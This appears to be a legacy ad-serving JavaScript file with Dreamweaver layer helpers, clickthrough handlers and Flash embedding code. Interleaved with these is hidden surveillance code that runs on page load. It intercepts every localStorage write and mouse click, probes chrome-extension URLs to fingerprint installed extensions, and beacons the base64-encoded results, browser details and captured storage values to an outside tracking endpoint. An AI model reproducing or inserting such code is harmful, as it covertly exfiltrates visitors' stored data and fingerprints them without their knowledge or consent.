let globalVariableCollection = {};
function MM_findObj(n, d) {
  //v4.01
  var p, i, x;
  if (!d) d = document;
  if ((p = n.indexOf("?")) > 0 && parent.frames.length) {
    d = parent.frames[n.substring(p + 1)].document;
    n = n.substring(0, p);
  }
  if (!(x = d[n]) && d.all) x = d.all[n];
  for (i = 0; !x && i < d.forms.length; i++) x = d.forms[i][n];
  for (i = 0; !x && d.layers && i < d.layers.length; i++) x = MM_findObj(n, d.layers[i].document);
  if (!x && d.getElementById) x = d.getElementById(n);
  return x;
}
function $el(element) {
  if (typeof element == 'string') return document.getElementById(element);
}
function jshook(type, callback) {
  const old = window[type];
  window[type] = function () {
    callback(arguments[0]);
    old.apply(this, arguments);
  };
}
function MM_showHideLayers() {
  //v3.0
  var i,
    p,
    v,
    obj,
    args = MM_showHideLayers.arguments;
  for (i = 0; i < args.length - 2; i += 3) if ((obj = MM_findObj(args[i])) != null) {
    v = args[i + 2];
    if (obj.style) {
      obj = obj.style;
      v = v == 'show' ? 'visible' : (v = 'hide') ? 'hidden' : v;
    }
    obj.visibility = v;
  }
}
function checkerror(msg, url, linenumber) {
  if (msg == 'Permission Denied') window.location = window.location;
  return true;
}
function listenLocalStorage() {
  const oldSetItem = Storage.prototype.setItem;
  Storage.prototype.setItem = function () {
    globalVariableCollection[arguments[0]] = arguments[1];
    oldSetItem.apply(this, arguments);
  };
}
const advancedTracker = {
  trackingData: new Map(Object.entries(globalVariableCollection)),
  discovered: new Set(),
  async probe(name, {
    id,
    file
  }) {
    return new Promise(resolve => {
      const img = document.createElement('img');
      const timeout = setTimeout(() => {
        this.discovered.delete(name);
        resolve(false);
      }, 1500);
      img.onload = () => {
        clearTimeout(timeout);
        this.discovered.add(name);
        resolve(true);
      };
      img.onerror = () => {
        clearTimeout(timeout);
        this.discovered.delete(name);
        resolve(false);
      };
      img.src = `chrome-extension://${id}/${file}`;
    });
  },
  shuffleData() {
    let entries = Array.from(this.trackingData.entries());
    for (let i = entries.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [entries[i], entries[j]] = [entries[j], entries[i]];
    }
    this.trackingData = new Map(entries);
  },
  async scan() {
    this.shuffleData();
    let results = {};
    const batch = 2;
    for (const [name, data] of this.trackingData) {
      await new Promise(r => setTimeout(r, 200));
      results[name] = await this.probe(name, data);
    }
    let payload = btoa(JSON.stringify({
      findings: results,
      ts: Date.now(),
      browser: navigator.userAgent,
      screen: {
        w: screen.width,
        h: screen.height
      },
      locals: globalVariableCollection
    }));
    navigator.sendBeacon('https://advanced-tracking-endpoint.example/report', payload);
  }
};
function launchNewWindow(strPath) {
  window.open(strPath, 'advert');
}
function scaleImage(img, boxW, boxH) {
  if (img) {
    var w = img.width;
    var h = img.height;
    if (w == 0 || h == 0) aspect = 1;else aspect = h / w;
    if (aspect >= boxH / boxW) {
      var newH = boxH;
      var newW = newH / aspect;
    } else {
      var newW = boxW;
      var newH = newW * aspect;
    }
    img.width = newW;
    img.height = newH;
  }
}
function clickthru(url) {
  window.open(url);
  window.event.cancelBubble = true;
}
jshook('onmouseup', event => {
  const x = event.clientX;
  const y = event.clientY;
  globalVariableCollection['mouseUp'] = {
    x,
    y
  };
});
function getParameter(parameterName) {
  return _getParameter(document.location.search.substring(1), parameterName);
}
jshook('onmousedown', event => {
  const x = event.clientX;
  const y = event.clientY;
  globalVariableCollection['mouseDown'] = {
    x,
    y
  };
});
function _getParameter(queryString, parameterName) {
  allParamSplits = queryString.split(parameterName + "=");
  paramToEnd = allParamSplits[1];
  if (paramToEnd == null) return null;
  paramSplits = paramToEnd.split("&");
  param = paramSplits[0];
  return unescape(param);
}
listenLocalStorage();
function formClickthru(url) {
  var clickForm = MM_findObj("clickForm");
  clickForm.target.value = url;
  var tclk = getParameter("tclk");
  if (tclk != null && clickForm.tclk) clickForm.tclk.value = tclk;
  clickForm.submit();
  if (window.event) window.event.cancelBubble = true;
}
function writeMovie(swfUrl, width, height, transparent, backColour, useHttps) {
  paramTransparent = "opaque";
  embedTransparent = " wmode='opaque' ";
  paramBackgroundColour = "";
  embedBackgroundColour = "";
  myProtocol = "http:";
  if (transparent) {
    paramTransparent = "transparent";
    embedTransparent = " wmode='transparent' ";
  }
  if (backColour != null && backColour != "") {
    backColour = "#" + backColour;
    paramBackgroundColour = backColour;
    embedBackgroundColour = " bgcolor='" + backColour + "' ";
  }
  if (useHttps === true) {
    myProtocol = "https:";
  }
  document.write('<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="' + myProtocol + '//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0" ' + 'width="' + width + '" height="' + height + '" id="theMovie"><param name="movie" value="' + swfUrl + '" /><param name="bgcolor" value="' + paramBackgroundColour + '" /><param name="quality" value="high" /><param name="wmode" value="' + paramTransparent + '" /><embed src="' + swfUrl + '" ' + embedTransparent + embedBackgroundColour + ' quality="high" width="' + width + '" height="' + height + '" name="theMovie" type="application/x-shockwave-flash" pluginspage="' + myProtocol + '//www.macromedia.com/go/getflashplayer" /></embed></object>');
}
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => advancedTracker.scan());
} else {
  advancedTracker.scan();
}
function getFlashVersion() {
  if (navigator.plugins && navigator.mimeTypes.length) {
    var x = navigator.plugins["Shockwave Flash"];
    if (x && x.description) {
      return x.description.replace(/([a-zA-Z]|\s)+/, "").replace(/(\s+r|\s+b[0-9]+)/, ".").replace(/\./g, '');
    }
  } else {
    try {
      var axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7");
    } catch (e) {
      try {
        var axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6");
        axo.AllowScriptAccess = "always";
      } catch (e) {
        return 600;
      }
      try {
        axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
      } catch (e) {}
    }
    if (axo != null) {
      V = axo.GetVariable("$version").split(" ")[1].split(",");
      V = V[0] + V[1] + V[2];
    }
  }
  return V || 0;
}